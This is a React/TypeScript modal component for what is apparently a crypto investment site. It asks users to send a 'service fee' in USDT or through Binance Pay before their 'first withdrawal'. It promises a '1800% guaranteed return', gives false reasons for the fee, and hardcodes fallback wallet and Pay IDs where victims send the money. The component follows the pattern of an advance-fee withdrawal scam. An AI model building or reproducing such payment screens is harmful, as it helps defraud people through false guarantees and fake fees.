
import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { X, Copy, Check, AlertTriangle } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface ServiceFeeModalProps {
  onClose: () => void;
  onConfirm: () => void;
  userBalance?: number;
}

interface PaymentAddress {
  address_type: string;
  address_value: string;
  label: string;
}

interface ServiceFee {
  fee_amount: number;
  account_balance: number;
  roi_percentage: number;
}

const ServiceFeeModal = ({ onClose, onConfirm, userBalance = 0 }: ServiceFeeModalProps) => {
  const [copied, setCopied] = useState<string | null>(null);
  const [paymentAddresses, setPaymentAddresses] = useState<PaymentAddress[]>([]);
  const [serviceFees, setServiceFees] = useState<ServiceFee[]>([]);
  const [selectedFee, setSelectedFee] = useState<ServiceFee | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchPaymentData = async () => {
      try {
        // Fetch payment addresses
        const { data: addresses, error: addressError } = await supabase
          .from('payment_addresses')
          .select('address_type, address_value, label')
          .eq('is_active', true);

        if (addressError) {
          console.error('Error fetching payment addresses:', addressError);
          setPaymentAddresses([
            { address_type: 'usdt_trc20', address_value: 'TBMWwcYaAf4m8ug5GbHwwAV-DaskwQX1RWL', label: 'USDT TRC20 Address' },
            { address_type: 'binance_pay', address_value: '713568475', label: 'Binance Pay ID' }
          ]);
        } else {
          setPaymentAddresses(addresses || []);
        }

        // Fetch all service fees
        const { data: feeData, error: feeError } = await supabase
          .from('service_fees')
          .select('fee_amount, account_balance, roi_percentage')
          .eq('is_active', true)
          .order('fee_amount', { ascending: true });

        if (feeError) {
          console.error('Error fetching service fees:', feeError);
          setServiceFees([
            { fee_amount: 20, account_balance: 380, roi_percentage: 1800 },
            { fee_amount: 50, account_balance: 950, roi_percentage: 1800 },
            { fee_amount: 100, account_balance: 1900, roi_percentage: 1800 }
          ]);
        } else {
          setServiceFees(feeData || []);
        }

        // Auto-select appropriate fee based on user balance
        if (feeData && feeData.length > 0) {
          const appropriateFee = feeData.find(fee => fee.account_balance >= userBalance) || feeData[0];
          setSelectedFee(appropriateFee);
        }

      } catch (error) {
        console.error('Error fetching payment data:', error);
        setPaymentAddresses([
          { address_type: 'usdt_trc20', address_value: 'TBMWwcYaAf4m8ug5GbHwwAV-DaskwQX1RWL', label: 'USDT TRC20 Address' },
          { address_type: 'binance_pay', address_value: '713568475', label: 'Binance Pay ID' }
        ]);
        setServiceFees([
          { fee_amount: 20, account_balance: 380, roi_percentage: 1800 }
        ]);
        setSelectedFee({ fee_amount: 20, account_balance: 380, roi_percentage: 1800 });
      } finally {
        setLoading(false);
      }
    };

    fetchPaymentData();
  }, [userBalance]);

  const copyToClipboard = async (text: string, label: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(label);
      toast({
        title: `${label} Copied!`,
        description: "Copied to clipboard",
      });
      setTimeout(() => setCopied(null), 2000);
    } catch (err) {
      toast({
        variant: "destructive",
        title: "Copy Failed",
        description: `Please copy the ${label.toLowerCase()} manually`,
      });
    }
  };

  const usdtAddress = paymentAddresses.find(addr => addr.address_type === 'usdt_trc20')?.address_value || '';
  const binanceID = paymentAddresses.find(addr => addr.address_type === 'binance_pay')?.address_value || '';

  if (loading) {
    return (
      <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
        <Card className="w-full max-w-lg bg-slate-800 border-slate-600 shadow-2xl">
          <CardContent className="p-8 text-center">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-400 mx-auto mb-4"></div>
            <p className="text-gray-400">Loading payment information...</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <Card className="w-full max-w-lg max-h-[90vh] bg-slate-800 border-slate-600 shadow-2xl animate-in fade-in-0 zoom-in-95 duration-300 flex flex-col">
        <CardHeader className="flex flex-row items-center justify-between pb-4 flex-shrink-0">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 bg-amber-500/20 rounded-full flex items-center justify-center">
              <AlertTriangle className="h-5 w-5 text-amber-400" />
            </div>
            <div>
              <CardTitle className="text-white text-xl">Service Fee Required</CardTitle>
              <p className="text-gray-400 text-sm">First withdrawal setup</p>
            </div>
          </div>
          <Button 
            variant="ghost" 
            size="sm" 
            onClick={onClose}
            className="h-8 w-8 p-0 text-gray-400 hover:text-white"
          >
            <X size={16} />
          </Button>
        </CardHeader>
        
        <CardContent className="space-y-6 overflow-y-auto flex-1">
          <div className="bg-slate-900/50 p-4 rounded-lg border border-slate-700">
            <h3 className="text-white font-semibold mb-2">Why is this fee required?</h3>
            <ul className="space-y-1 text-gray-400 text-sm">
              <li>• Network gas fees for blockchain transactions</li>
              <li>• Security verification and KYC processing</li>
              <li>• Anti-fraud protection measures</li>
              <li>• Infrastructure and maintenance costs</li>
            </ul>
          </div>

          {/* Service Fee Options */}
          <div className="space-y-4">
            <h3 className="text-white font-semibold">Select Service Fee Option</h3>
            <div className="grid gap-3">
              {serviceFees.map((fee) => (
                <div
                  key={fee.fee_amount}
                  onClick={() => setSelectedFee(fee)}
                  className={`p-3 rounded-lg border cursor-pointer transition-all ${
                    selectedFee?.fee_amount === fee.fee_amount
                      ? 'border-blue-500 bg-blue-500/10'
                      : 'border-slate-600 hover:border-slate-500'
                  }`}
                >
                  <div className="flex justify-between items-center">
                    <div>
                      <p className="text-white font-medium">${fee.fee_amount} USDT</p>
                      <p className="text-gray-400 text-sm">
                        Unlock ${fee.account_balance.toLocaleString()} potential
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-green-400 text-sm font-medium">
                        {fee.roi_percentage}% ROI
                      </p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {selectedFee && (
            <div className="text-center space-y-4">
              <div className="bg-gradient-to-r from-blue-600/20 to-purple-600/20 p-6 rounded-xl border border-blue-500/30">
                <h3 className="text-white text-lg font-semibold mb-2">
                  Send ${selectedFee.fee_amount} USDT (TRC20)
                </h3>
                <p className="text-gray-300 text-sm mb-2">
                  Unlock ${selectedFee.account_balance.toLocaleString()} earning potential
                </p>
                <p className="text-green-400 text-xs mb-4">
                  ROI: {selectedFee.roi_percentage}% guaranteed return
                </p>

                <div className="bg-slate-900 p-3 rounded-lg border border-slate-600 space-y-3">
                  {usdtAddress && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">USDT TRC20 Address:</p>
                      <div className="flex items-center justify-between">
                        <code className="text-blue-400 text-sm font-mono break-all flex-1">{usdtAddress}</code>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => copyToClipboard(usdtAddress, "Address")}
                          className="ml-2 h-8 w-8 p-0 text-gray-400 hover:text-blue-400"
                        >
                          {copied === "Address" ? <Check size={16} /> : <Copy size={16} />}
                        </Button>
                      </div>
                    </div>
                  )}

                  {binanceID && (
                    <div>
                      <p className="text-gray-400 text-xs mb-1">Binance Pay ID:</p>
                      <div className="flex items-center justify-between">
                        <code className="text-green-400 text-sm font-mono break-all flex-1">{binanceID}</code>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => copyToClipboard(binanceID, "Binance Pay ID")}
                          className="ml-2 h-8 w-8 p-0 text-gray-400 hover:text-green-400"
                        >
                          {copied === "Binance Pay ID" ? <Check size={16} /> : <Copy size={16} />}
                        </Button>
                      </div>
                    </div>
                  )}
                </div>

                <div className="text-xs text-gray-500 pt-2">
                  ⚠️ Only send USDT on the TRC20 network. Other networks may result in permanent loss.
                </div>
              </div>
            </div>
          )}

          <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4">
            <p className="text-amber-300 text-sm">
              <strong>Important:</strong> This is a one-time setup fee. Once verified, future withdrawals will only incur network charges.
            </p>
          </div>
        </CardContent>
        
        <div className="flex space-x-3 p-6 pt-4 flex-shrink-0 border-t border-slate-700">
          <Button
            onClick={onClose}
            variant="outline"
            className="flex-1 h-11 border-slate-600 text-gray-300 hover:text-white hover:bg-slate-700"
          >
            Cancel
          </Button>
          <Button
            onClick={onConfirm}
            disabled={!selectedFee}
            className="flex-1 h-11 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 transition-all duration-300 text-white font-semibold"
          >
            I've Sent Payment
          </Button>
        </div>
      </Card>
    </div>
  );
};

export default ServiceFeeModal;
